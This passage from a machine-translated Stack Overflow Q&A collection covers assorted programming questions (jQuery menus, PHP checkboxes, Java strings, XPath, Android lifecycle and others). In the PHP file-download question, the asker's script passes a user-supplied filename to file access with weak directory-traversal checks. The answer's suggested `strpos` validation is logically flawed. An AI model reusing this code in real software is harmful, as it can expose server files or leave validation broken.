    <ul id="nav">
        <li id="lhome" class="">
            <a href="index.php" id="ahome" class="">Home</a>
        </li>
        <li id="lprod" class="">
            <a href="products.php" id="aprod" class="">Products</a>
            <ul>
                <li><a href="#">Link one</a></li>
                <li><a href="#">Link two</a></li>
                <li><a href="#">Link three</a></li>
                <li><a href="#">Link four</a></li>
            </ul>
        </li>
        <li id="ltest" class="">
            <a href="testimonial.php" id="atest" class="">Testimonials</a>
            <ul>
                <li><a href="#">Link one</a></li>
                <li><a href="#">Link two</a></li>
                <li><a href="#">Link three</a></li>
                <li><a href="#">Link four</a></li>
            </ul>
        </li>
        <li id="lcont" class="">
            <a href="contact.php" id="acont" class="">Contact&nbsp;Us</a>
        </li>
    </ul>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:03:38.687

您现有的代码似乎运行良好，请参阅[**DEMO**](http://jsfiddle.net/urhDr/)

**编辑**

根据您的反馈，我进行了更多研究，发现您的 CSS 干扰了动画。

If you look at the original demo I linked above which has no styles you see the slide down/up takes the 100 milliseconds as specified.

If you look at your [**DEMO**](http://jsfiddle.net/urhDr/8/) with the CSS you see the menus just appear.

After a little trial and error I pinpointed the CSS causing this. If you remove the below section from the CSS your animation of the sub-menu is working again as expected.

```
/* Make the sub menus appear on hover */
#menu ul li:hover ul,
#menu ul li.hover ul { /* This line is required for IE 6 and below */
   display:block; /* Show the sub menus */
} 
```

The above CSS overwrites the animation from the slide down/up methods and simply displays the sub-menu as a block instead. It still works if you leave the IE6 fix in but you have to remove the CSS for `#menu ul li:hover ul` :

```
/* Make the sub menus appear on hover */
#menu ul li.hover ul { /* This line is required for IE 6 and below */
   display:block; /* Show the sub menus */
} 
```

I applied the changes to the fiddle and it is working now.
See [**DEMO**](http://jsfiddle.net/urhDr/14/)

# php - 逗号分隔的复选框值

> ID：11820376
> 
> 赞同：1
> 
> 时间：2012-08-05T21:54:26.130
> 
> 标签：php, checkbox, get

有谁知道如何以逗号分隔的方式输出复选框值？假设我有 2 个复选框：

*   `<input id="filetype_photo" name="type" type="checkbox" value="photo" >`
*   `<input id="filetype_graphic" name="type" type="checkbox" value="graphic" >`

如果我用 $_GET 检索它们，我会得到以下网址：

*   sitename.com?type=photo&type=graphic 如果两个复选框都被选中，我的目标是获取以下网址：
*   sitename.com?type=photo,graphic

我尝试使用复选框数组将它们重命名为 name[] 并使用以下函数来读取结果：

```
$type=$_GET['type'];
while (list ($key,$val) = @each ($type)) {
echo $val;
} 
```

但这给了我复选框值，但不能解决 url 问题。此外，通过将 type=photo 更改为 &type%5B%5D=photo 会弄乱网址

有任何想法吗？

PS我需要解决服务器端

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T22:01:53.183

采用：

```
<input id="filetype_photo" name="type[]" type="checkbox" value="photo" >
<input id="filetype_graphic" name="type[]" type="checkbox" value="graphic" > 
```

你的`$type=$_GET['type']`将是一个数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T21:58:10.700

PHP 不能处理具有相同名称的多个参数，除非它们以方括号结尾。如果您想避免使用查询字符串，则需要手动解析它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T21:58:38.287

使用 Javascript 编译以逗号分隔的值字符串并使用 window.location 进行重定向

# java - 逐个字符比较java中的两个字符串

> ID：11820377
> 
> 赞同：9
> 
> 时间：2012-08-05T21:54:34.993
> 
> 标签：java, string, char, compareto

我是java的初学者，我正在尝试按字符比较java char中的两个字符串，并通过以下代码找到它们有多少不同的字符，但它不起作用，

```
 min is the min between the 2 strings

     for(int i=0; i<min-1; i++){
            s1 = w1.substring(j,j++);
            s2 = w2.substring(j,j++);

            if (! s1.equalsIgnoreCase(s2) ){
                counter++;    
            }
      }` 
```

有小费吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-05T21:56:21.330

用这个：

```
char[] first  = w1.toLowerCase().toCharArray();
char[] second = w2.toLowerCase().toCharArray();

int minLength = Math.min(first.length, second.length);

for(int i = 0; i < minLength; i++)
{
        if (first[i] != second[i])
        {
            counter++;    
        }
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-05T21:57:58.133

使用 charAt(index) 方法并对两个字符使用 '==' 运算符：

```
c1 = w1.charAt(j);
c2 = w2.charAt(j);

if (c1 == c2) ){
   counter++;    
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-05T21:59:12.930

```
int i =0;
for(char c : w1.toCharArray())){
   if(i < w2.length() && w2.charAt(i++) != c)
     counter++;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-05T22:24:25.823

我们可以用`substring`. 但是让我们先看看你的代码：

```
// assuming, min is the minimum length of both strings,
// then you don't check the char at the last position
for(int j=0; j < min-1; j++) {

  // s1, s2 will always be empty strings, because j++ is post-increment:
  // it will be incremented *after* it has been evaluated
  s1 = w1.substring(j,j++);
  s2 = w2.substring(j,j++);

  if (!s1.equalsIgnoreCase(s2) ){
    counter++;    
  }
} 
```

基于的解决方案`substring`可能是这样的：

```
for(int j=0; j < min; j++) {
  s1 = w1.substring(j,j+1);
  s2 = w2.substring(j,j+1);

  if (!s1.equalsIgnoreCase(s2) ){
    counter++;    
  }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-01T02:04:32.967

我在一个 Java 培训教程中的笔记需要与 charAt() 和嵌套循环进行字符串比较...可以轻松更改该方法以从源字符串中返回不匹配的字符...但我会留给你一个... ;-)

```
public class SubString {

public static boolean findTarget( String target, String source ) {

    int target_len = target.length();
    int source_len = source.length();

    boolean found = false;

    for(int i = 0; ( i < source_len && !found ); ++i) {

    int j = 0;

        while( !found ) {

            if( j >= target_len ) {
                break;
            }

            /**
             * Learning Concept:
             *
             *  String target = "for";
             *  String source = "Searching for a string within a string the hard way.";
             *
             *  1 - target.charAt( j ) :
             *    The character at position 0 > The first character in 'Target' > character 'f', index 0.
             *
             *  2 - source.charAt( i + j) :
             *
             *    The source strings' array index is searched to determine if a match is found for the
             *    target strings' character index position. The position for each character in the target string
             *    is then compared to the position of the character in the source string.
             *
             *    If the condition is true, the target loop continues for the length of the target string.
             *
             *    If all of the source strings' character array element position matches the target strings' character array element position
             *    Then the condition succeeds ..
             */

            else if( target.charAt( j ) != source.charAt( i + j ) ) {
                break;
            } else {
                ++j;
                if( j == target_len ) {
                    found = true;
                }
            }
        }

    }

    return found;

}

public static void main ( String ... args ) {

String target = "for";
String source = "Searching for a string within a string the hard way.";

System.out.println( findTarget(target, source) );

}

} 
```

# c++ - 构建一个二进制字符串 C++

> ID：11820378
> 
> 赞同：2
> 
> 时间：2012-08-05T21:54:43.610
> 
> 标签：c++, string, binary

如何在 C++ 中构建二进制字符串？

我想以这种格式拥有它：

```
 std::string str = signed long (4bytes) "fill out zeros" 0x000 (8bytes) signed long (4bytes) 
```

注意我不想要可见的二进制表示，而是字符串中的实际二进制数据

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T22:44:26.593

对于您的特定应用：

```
std::string data(12, 0);  // construct string of 12 null-bytes

int32_t x, y;  // populate

char const * const p = reinterpret_cast<char const *>(&x);
char const * const q = reinterpret_cast<char const *>(&y);

std::copy(p, p + 4, data.begin()    );
std::copy(q, q + 4, data.begin() + 8); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-05T22:03:59.453

```
char buffer[1024];
// fill up buffer with whatever
char *end = afterLastChar;
std:string s(buffer, afterLastChar); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T22:18:48.723

使用 std::vector<uint8_t>，这不是字符串

# javascript - Apache Thrift Java-Javascript 通信

> ID：11820379
> 
> 赞同：8
> 
> 时间：2012-08-05T21:54:50.363
> 
> 标签：javascript, java, thrift

我正在编写一个基于 Apache Thrift 的 Java 服务器，它将接收来自 Javascript 客户端的数据。我已经完成了 Java 服务器，但问题是我可以获得 Javascript 客户端的工作示例（我无法找到一个好的示例）。构建文档中的示例不是很有帮助。我当前的 Javascript 客户端如下：

```
function testServer() {
    try {
        var transport = new Thrift.Transport("http://127.0.0.1:9090");
        var protocol  = new Thrift.Protocol(transport);
        var client = new JavaEventClient(protocol);

        var alive = client.isServerAlive();
    } catch(e) {
    }
}

testServer(); 
```

但是代码不起作用 - 因为 Java 服务器抛出“内存不足”错误。我不知道错误是由于我的客户端代码还是 Apache Thrift。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T11:28:42.300

看起来像是通信中的问题。也许您在服务器和客户端上使用不同的协议或传输。或该协议的实现中的错误。// 例如，我在 thrift-javascript 序列化中发现了带有 utf8 字符的错误。

请查看[https://github.com/imysak/using-thrift](https://github.com/imysak/using-thrift)（我和我的朋友编写了这个通过 thrift 进行 Java-Node.js 通信的简单示例）。

我希望你可以使用我们的 JS 实现中的一些东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-25T13:23:24.800

当`Out Of Memory`您的服务器正在使用`TBinaryProtocol`但您尝试以另一种方式访问​​它时会发生错误，例如使用浏览器（它说 HTTP）。IMO 这是一个错误。应该有一些不错的错误消息。

如何使 Thrift Java 服务器与 Thrift Javascript 客户端一起工作的文件分散在整个源代码中。我在这里将它们一起困惑：[https ://github.com/LukeOwncloud/ThriftJavaJavascriptDemo](https://github.com/LukeOwncloud/ThriftJavaJavascriptDemo)

# php - 如何使用 phpstorm 和 zend 框架进行单元测试？

> ID：11820384
> 
> 赞同：1
> 
> 时间：2012-08-05T21:56:12.407
> 
> 标签：php, zend-framework, phpunit, pear, phpstorm

我正在尝试使用 phpstorm 在我的框架上运行一些测试。

我正在使用 xampp，并且我安装了 php 单元。

该框架位于：

```
C:\xampp\htdocs\zend\zend\application\
C:\xampp\htdocs\zend\zend\library\
C:\xampp\htdocs\zend\zend\library\zend\...
... 
```

我设置的 php 解释器是 php 5.4.4

当我运行测试时，我得到

C:\xampp\php\php.exe C:\Users\test\AppData\Local\Temp\ide-phpunit.php --no-configuration C:\xampp\htdocs\zend\zend 测试于下午 2:24 开始...

警告：require_once(Zend/Cache/Backend/ExtendedInterface.php)：打开流失败：C:\xampp\htdocs\zend\zend\library\Zend\Cache\Backend\Test.php 中没有这样的文件或目录在线27

致命错误：require_once()：在 C:\xampp\htdocs\zend\zend\library 中打开所需的 'Zend/Cache/Backend/ExtendedInterface.php' (include_path='.;C:\xampp\php\PEAR') 失败\Zend\Cache\Backend\Test.php 在第 27 行

进程以退出代码 255 结束

在 zend 库的 Test.php 中有一个包含`require_once 'Zend/Cache/Backend/ExtendedInterface.php';`，似乎 ide 无法找出路径。

关于这个问题的任何想法？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:01:41.530

您需要配置其他包含路径。我建议你用你的项目设置来做。为此，请双击[*Project Tool Window*](http://www.jetbrains.com/phpstorm/webhelp/project-tool-window.html) 末尾的*![外部库](../Images/4698edaea9e48df876872cda9e734cd0.png)External Libraries*。[](http://www.jetbrains.com/phpstorm/webhelp/project-tool-window.html)

 *当你调用单元测试时，PHPStorm 会自动添加这些。

只需将 Zend Framework 路径添加为包含路径，您应该已经解决了这些问题。*

# c# - 使用 XPath 查询 HTML 文档

> ID：11820388
> 
> 赞同：1
> 
> 时间：2012-08-05T21:56:41.717
> 
> 标签：c#, html, xpath

我有一个 HTML 文档，我想使用 C# 和 XPath 进行查询。我正在寻找的是一个 XPath 表达式——而不是 XSLT、C#、PHP 或任何其他特定于语言的代码示例。任何帮助将不胜感激，但我只需要 XPath 表达式:)。

```
<tr>
  <td>
    <p>
      <span>text</span>
    </p>
  </td>
  <td>
    <p>
      <span>text</span>
    </p>
  </td>
</tr>
<tr>
  <td>
    <p>
      <span>This text is static and will never change</span>
    </p>
  </td>
  <td>
    <p>
      <span>Bla bla bla .... more bla bla bla</span>
    </p>
  </td>
</tr>
<tr>
  <td>
    <p>
      <span>text</span>
    </p>
  </td>
  <td>
    <p>
      <span>text</span>
    </p>
  </td>
</tr> 
```

我正在寻找的 XPath 表达式将提取当前由字符串实例“Bla bla bla .... more bla bla bla”表示的文本。这个文本会因 HTML 文档而异，但一个字符串总是相同的。在这种情况下，该字符串表示为“此文本是静态的，永远不会改变”。

“这个文本是静态的，永远不会改变”和“Bla bla bla .... more bla bla bla”当然不是真正的字符串 - 我替换了它们，因为它们是特定于域的，与问题无关并且它们显示敏感不能显示的数据！

同样，任何帮助都将受到高度赞赏。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:08:56.177

**使用**：

```
/*/tr[2]/td[2]/p/span/text() 
```

当针对以下 XML 文档（通过将提供的格式错误的 HTML 转换为格式正确的 XML 文档获得）评估此 XPath 表达式时：

```
<table>
    <tr>
        <td>
            <p>
                <span>text</span>
            </p>
        </td>
        <td>
            <p>
                <span>text</span>
            </p>
        </td>
    </tr>
    <tr>
        <td>
            <p>
                <span>Some text</span>
            </p>
        </td>
        <td>
            <p>
                <span>text to extract</span>
            </p>
        </td>
    </tr>
    <tr>
        <td>
            <p>
                <span>text</span>
            </p>
        </td>
        <td>
            <p>
                <span>text</span>
            </p>
        </td>
    </tr>
</table> 
```

**`"text to extract"`根据需要选择具有值的文本节点**。

**基于 XSLT 的验证**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="node()|@*">
     "<xsl:copy-of select="/*/tr[2]/td[2]/p/span/text()"/>"
 </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于同一个 XML 文档（如上）时，将评估 XPath 表达式并将此评估的结果复制到输出**：

```
"text to extract" 
```

**或者，如果您知道文本但想选择包含它的元素（例如`td`），则使用**：

```
//text()[. = 'text to extract']/ancestor::td[1] 
```

再次使用基于 XSLT 的验证：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="node()|@*">
     <xsl:copy-of select=
      "//text()[. = 'text to extract']/ancestor::td[1]"/>
 </xsl:template>
</xsl:stylesheet> 
```

**现在的结果是**：

```
<td>
   <p>
      <span>text to extract</span>
   </p>
</td> 
```

**还有一个猜测**：

如果要查找最近的*前面*文本节点，请使用：

```
//text()[. = 'text to extract']/preceding::text()[1] 
```

**基于 XSLT 的验证：**

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="node()|@*">
     "<xsl:copy-of select=
      "//text()[. = 'text to extract']/preceding::text()[1]"/>"
 </xsl:template>
</xsl:stylesheet> 
```

**结果**：

```
"Some text" 
```

**更新**：

在 OP 的最新更新和他的新解释之后，他正在寻找的 XPath 表达式是：

```
//text()[. = 'This text is static and will never change']/following::text()[1] 
```

这将选择具有字符串值的文本节点：

```
"Bla bla bla .... more bla bla bla" 
```

# java - 这种未命名的静态神秘语法是什么意思？

> ID：11820392
> 
> 赞同：1
> 
> 时间：2012-08-05T21:57:52.140
> 
> 标签：java

在这个 NotePadProvider 示例代码中，我注意到类内部有一个**没有任何名称**且**没有任何类型**的静态块：

```
static {
    sUriMatcher = new UriMatcher(UriMatcher.NO_MATCH);
    sUriMatcher.addURI(NotePad.AUTHORITY, "notes", NOTES);
    sUriMatcher.addURI(NotePad.AUTHORITY, "notes/#", NOTE_ID);
    sUriMatcher.addURI(NotePad.AUTHORITY, "live_folders/notes", LIVE_FOLDER_NOTES);

    sNotesProjectionMap = new HashMap<String, String>();
    sNotesProjectionMap.put(NoteColumns._ID, NoteColumns._ID);
    sNotesProjectionMap.put(NoteColumns.TITLE, NoteColumns.TITLE);
    sNotesProjectionMap.put(NoteColumns.NOTE, NoteColumns.NOTE);
    sNotesProjectionMap.put(NoteColumns.CREATED_DATE, NoteColumns.CREATED_DATE);
    sNotesProjectionMap.put(NoteColumns.MODIFIED_DATE, NoteColumns.MODIFIED_DATE);

    // Support for Live Folders.
    sLiveFolderProjectionMap = new HashMap<String, String>();
    sLiveFolderProjectionMap.put(LiveFolders._ID, NoteColumns._ID + " AS " +
            LiveFolders._ID);
    sLiveFolderProjectionMap.put(LiveFolders.NAME, NoteColumns.TITLE + " AS " +
            LiveFolders.NAME);
    // Add more columns here for more robust Live Folders.
} 
```

这是什么`static { }`意思？

此外，使用这种简洁的语法比更易读的语法有什么优势（我只是假设存在这样的语法，直到第一个问题得到回答我才确定）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T21:59:13.400

那是类的静态初始化器。它只执行一次。什么时候？您第一次在应用程序中使用该类。

这个想法是构建一些变量、结构、数据等......（无论你喜欢什么），这些变量、结构、数据等将在该类的所有实例中使用。或者，例如，简单地为正弦值构建一个查找表。

它有多种调用方式。所有这些情况：

*   `new MyClass();`首先调用静态初始化程序，然后调用构造函数
*   `Class.forName("my.package.MyClass");`
*   `MyClass.staticMethodCallHere();`
*   `MyClass.class.methodCallHere();`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T22:03:51.763

这个静态 {} 块有什么用？

如果您有一个静态成员，那么您可以在没有此块的情况下创建它，例如：

```
static List<Integer> list = new ArrayList<Integer>(); 
```

但你不能用它做任何其他事情。此初始化程序块使您能够提交对静态内容的操作：

```
static List<Integer> list; // = new ArrayList<Integer>();

static
{
    list = new ArrayList<Integer>();
    for(int i=0; i<10; i++)  // just an example
        list.add(i);
} 
```

# unit-testing - 用于比较来自服务器的返回字符串的单元测试

> ID：11820399
> 
> 赞同：0
> 
> 时间：2012-08-05T21:58:44.600
> 
> 标签：unit-testing, ios5, ocunit

我正在尝试学习单元测试。以下是我第一次编写单元测试，用于比较从服务器返回的字符串。我确信我处理互联网连接的可用性和 nsnotification 的方式并不完美。测试 testGetURLEncodedString 总是打印 pass，因为其中没有 assert 语句。我不能把断言放在那里，因为我必须在收到响应后比较服务器返回的结果。任何人都可以请建议我纠正这样做的方法。

```
#import "MyAppTests.h"

@interface MyAppTests()
    @property(nonatomic) AppDelegate *delegate;
@end

@implementation MyAppTests

@synthesize delegate = _delegate;

- (void)setUp
{
    [super setUp];

    self.delegate = (AppDelegate *)[[UIApplication sharedApplication] delegate];
    if(![self.delegate internetConnectionAvailable])
    {
      STFail(@"Internet is not reachable.");
      exit(-1);
    }
}

- (void)tearDown
{
    _delegate = nil;
     [super tearDown];
}

- (void)testDelegate
{
     STAssertNotNil(self.delegate, @"Cannot find the application delegate");
}

- (void)testGetURLEncodedString
{
     [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(getURLEncodedStringSuccess:) name:@"getURLEncodedStringSuccess" object:nil];
     [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(getURLEncodedStringFailed:) name:@"getURLEncodedStringFailed" object:nil];

    [self.delegate getURLEncodedString:@"Testing Text"];
}

-(void)getURLEncodedStringSuccess:(NSNotification *)notification
{
    [[NSNotificationCenter defaultCenter] removeObserver:self name:@"getURLEncodedStringSuccess" object:nil];
    [[NSNotificationCenter defaultCenter] removeObserver:self name:@"getURLEncodedStringFailed" object:nil];

    STAssertTrue([[self.delegate getURLEncodedStringResponse] isEqualToString:@"Testing Text"], @"testGetURLEncodedString failed - did not receive expected response");
 }

-(void)getURLEncodedStringFailed:(NSNotification *)notification
{
    [[NSNotificationCenter defaultCenter] removeObserver:self name:@"getURLEncodedStringSuccess" object:nil];
    [[NSNotificationCenter defaultCenter] removeObserver:self name:@"getURLEncodedStringFailed" object:nil];

    STFail(@"testGetURLEncodedString failed - server failed returning result");
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-16T05:51:24.933

调用服务器并检查响应的自动化测试最好称为服务器的“验收测试”。但是它们应该与应用程序的单元测试目标保持在一个单独的目标中，因为单元测试需要非常快。保持它们快速的主要方法是避免任何真正的网络。这有点先进。

由于您刚刚开始使用 OCUnit，我建议您*不要*从验收测试开始，因为它们通常更难编写并且提供的反馈不太精确。相反，从最简单的测试开始，这些测试是对模型逻辑的测试。我的[Xcode TDD 101](https://qualitycoding.org/tdd-kata/)可能有助于学习单元测试的机制。

# php - php下载文件

> ID：11820401
> 
> 赞同：1
> 
> 时间：2012-08-05T21:58:59.003
> 
> 标签：php, file, download

您好我正在尝试从“上传”文件中下载文件。我正在使用薄cobe，但结果是“对不起，该文件似乎不存在”

这是我的电话

```
<a href="download.php?filename=<?php $row4['Arxeio'] ?>">Click here
to Download the File</a> 
```

并下载.php

```
<?php  session_start();

$filename = $_GET['filename'];

$download_path = './upload/';

if(eregi("\.\.", $filename)) die("I'm sorry, you may not download that file.");

$file = str_replace("..", "", $filename);
// Make sure we can't download .ht control files. if(eregi("\.ht.+", $filename)) die("I'm sorry, you may not download that file.");

// Combine the download path and the filename to create the full path to the file. $file = '$download_path$filename';

// Test to ensure that the file exists. 
if(!file_exists($file)) die("I'm sorry, the file doesn't seem to exist.");
// Extract the type of file which will be sent to the browser as a header
$type = filetype($file); // Get a date and timestamp $today = date("F j, Y, g:i a"); $time = time(); // Send file headers header("Content-type: $type"); header("Content-Disposition: attachment;filename=$filename");
header("Content-Transfer-Encoding: binary"); 
header('Pragma: no-cache'); 
header('Expires: 0'); // Send the file contents.
set_time_limit(0); 
readfile($file);
?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T22:03:56.860

在您的 HTML 中，您需要`echo`将文件名写入输出：

```
<a href='download.php?filename=<?php echo $row4['Arxeio']; ?>'>Click here to Download the File</a> 
```

在 PHP 中接收文件名时，您必须对其进行验证以防止目录遍历攻击。验证它是否包含 no`/`或`..`。你有一个基本的测试`eregi()`（顺便说一句，它[已被弃用](http://us3.php.net/manual/en/function.eregi.php)），但它可以简单地用`strpos()`.

```
if (strpos($filename, "..") >= 0 || strpos($filename, "/") >= 0) {
  // Error! don't permit file download
} 
```

还要查看[PHP 关于 NULL 字节攻击保护的文档](http://php.net/manual/en/security.filesystem.nullbytes.php)。

更好的是，将其与`$filename`下载的有效文件名白名单进行比较：

```
if (in_array($filename, array('file1.jpg', 'file2.txt', 'file3.mov',...)) {
  // Ok, send the file.
}
else {
  // Invalid file
} 
```

# java - 将字节或整数转换为位集

> ID：11820402
> 
> 赞同：14
> 
> 时间：2012-08-05T21:59:09.140
> 
> 标签：java, type-conversion, bitarray

我有以下内容：

```
int num=Integer.parseInt(lineArray[0]);
byte numBit= num & 0xFF; 
```

有什么非常简单的方法可以转换`numBit`为位数组吗？或者更好的是，有没有办法绕过 int 的字节转换并直接从`num`位数组？

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-05T22:21:32.330

如果您想要一个[BitSet](http://docs.oracle.com/javase/7/docs/api/java/util/BitSet.html#valueOf(byte[]))，请尝试：

```
final byte b = ...;
final BitSet set = BitSet.valueOf(new byte[] { b }); 
```

如果你想要一个`boolean[]`，

```
static boolean[] bits(byte b) {
  int n = 8;
  final boolean[] set = new boolean[n];
  while (--n >= 0) {
    set[n] = (b & 0x80) != 0;
    b <<= 1;
  }
  return set;
} 
```

或者，等效地，

```
static boolean[] bits(final byte b) {
  return new boolean[] {
    (b &    1) != 0,
    (b &    2) != 0,
    (b &    4) != 0,
    (b &    8) != 0,
    (b & 0x10) != 0,
    (b & 0x20) != 0,
    (b & 0x40) != 0,
    (b & 0x80) != 0
  };
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-03-25T18:11:24.357

Java 7 有 BitSet.valueOf(long[]) 和 BitSet.toLongArray()

```
int n = 12345;
BitSet bs = BitSet.valueOf(new long[]{n}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T22:07:34.253

你可以这样做：

`char[] bits = Integer.toBinaryString(num).toCharArray();`将底层位字符串作为`char[]`

例如

```
public BitSet getBitSet(int num){
    char[] bits = Integer.toBinaryString(num).toCharArray();  
    BitSet bitSet = new BitSet(bits.length);  
    for(int i = 0; i < bits.length; i++){  
        if(bits[i] == '1'){
            bitSet.set(i, true);
        }
        else{
            bitSet.set(i, false);
        }                
    }
    return bitSet;
} 
```

您也可以通过这种方式创建`boolean []`数组。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-07-04T12:31:51.750

只是使用**流**（J8+）的一个练习：

```
// J7+
BitSet bitSet(final long... nums) {
    return BitSet.valueOf(nums);
}

// J8+
final IntStream bitsSet = bitSet(num).stream();

// vice-versa
BitSet bitSet(final IntStream bitsSet) {
    return bitsSet.collect(BitSet::new, BitSet::set, BitSet::or);
}

// without BitSet
IntStream bitsSet(final long... nums) {
    return IntStream.range(0, nums.length)
            .flatMap(n -> IntStream.range(0, Long.SIZE - 1)
                    .filter(i -> 0 != (nums[n] & 1L << i))
                    .map(i -> i + n * Long.SIZE));
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-11-03T13:14:26.933

我来到这个线程是因为 Android`BitSet.valueOf()`在 API 19 中添加了。我使用了 oldrinb 的第二个已接受答案的片段，但由于它有一些错误而不得不修改它。另外我修改它以返回一个 BitSet，但将其更改为 boolean[] 应该不是问题。请参阅我对他的回复的评论。

这是现在成功运行的修改：

```
public static BitSet toBitSet(byte b) {
    int n = 8;
    final BitSet set = new BitSet(n);
    while (n-- > 0) {
        boolean isSet = (b & 0x80) != 0;
        set.set(n, isSet);
        b <<= 1;
    }
    return set;
} 
```

# android - 在旧 API 版本上退出应用程序后，Android 活动仍然处于活动状态

> ID：11820409
> 
> 赞同：2
> 
> 时间：2012-08-05T21:59:51.327
> 
> 标签：android, android-manifest, android-activity, android-orientation, android-screen

我的问题与以下用户行为有关：

1.  打开应用程序
2.  关闭应用程序（使用后退按钮）
3.  从纵向旋转到横向（或从横向到纵向）
4.  打开应用程序

当应用程序第二次打开时，`onCreate`由于屏幕方向发生了变化，该方法被执行了两次。

我做了一些测试，似乎问题只发生在运行版本早于 Android 3.0 的设备上（我没有测试每个版本）。

在我运行 Android 4.0 的平板电脑上，应用程序在第二次启动时以正确的初始方向打开，导致该`onCreate`方法仅被调用一次。但是在我运行 Android 2.3.5 (HTC Desire HD) 的手机上，第二次启动会以错误的方向打开前一个 Activity 实例，导致重新启动并执行 2 次主要 Activity 的`onCreate`方法。

我已阅读[任务和返回堆栈 | Android 开发人员](https://developer.android.com/guide/components/tasks-and-back-stack.html)`android:launchMode`并尝试在主要活动上使用、`android:clearTaskOnLaunch`等的各种组合。但这似乎不是诀窍。

有什么建议么？从 Android 2.0 到 3.0 是否对使用“后退”按钮退出应用程序的方式进行了任何更改？还是仅在某些设备上发生这种情况，与 Android 版本无关？

活动：

```
public class MyActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(getClass().getName(), "onCreate");
        setContentView(R.layout.main);
    }
} 
```

布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">
    <TextView android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:text="Hello World, MyActivity" />
</LinearLayout> 
```

显现：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
      package="com.example" android:versionCode="1" android:versionName="1.0">
    <uses-sdk android:minSdkVersion="7"/>
    <application android:label="@string/app_name" android:icon="@drawable/ic_launcher">
        <activity android:name="MyActivity" android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T00:35:38.477

谢尔盖是对的，如果你添加到你的代码

```
<activity android:name="MyActivity"
          android:label="@string/app_name"
          android:configChanges="orientation"> 
```

和

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Log.d(getClass().getName(), "onCreate");
    if(savedInstanceState == null) {
        setContentView(R.layout.main);
    }
}

@Override
public void onConfigurationChanged(Configuration newConfig) {
    super.onConfigurationChanged(newConfig);
    setContentView(R.layout.main);

} 
```

onCreate 只会在活动启动时执行一次。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:13:39.070

我认为该问题的正确解决方案是避免在 Activity 的 onCreate 方法中做很多事情，因此方向更改不会导致问题。

看看这个问题：[Activity restart on rotation Android](https://stackoverflow.com/questions/456211/activity-restart-on-rotation-android)

或者，`android:configChanges="orientation"`在清单中声明应该通知操作系统它不应该破坏和重新创建方向变化的活动，`onConfigurationChanged`而是调用。

# jquery - 使用ajax提交按钮的父div的id

> ID：11820420
> 
> 赞同：0
> 
> 时间：2012-08-05T22:01:38.907
> 
> 标签：jquery, ajax, post, parent

我正在尝试提交按钮使用 AJAX 的父 DIV 的 ID。这是标记：

```
<div id="32"><input id="button" type="button" class="before" onclick="add_fav();" /></div> 
```

这是当前状态的 ajax 脚本：

```
<script>
function add_fav()
{   
jQuery.ajax({       
      url: 'addfav.php',
      type: 'POST',
      data: {'id':jQuery(this).closest("div").attr("id"),is_ajax: 1},
      success: function(html) {
        jQuery('#button').removeClass('before');
        jQuery('#button').addClass('after');
        jQuery('#button').attr('disabled', 'disabled');
      }, 
      error: function() {
        jQuery('#error').html('<div>Error! Unable to add food item.</div>');
      }
    });
}
</script> 
```

这不起作用，所以我用来传递 DIV 的 id 的方法显然是不正确的。也许有人可以让我直截了当？

* * *

## 回答 #1

> 赞同：1
> 
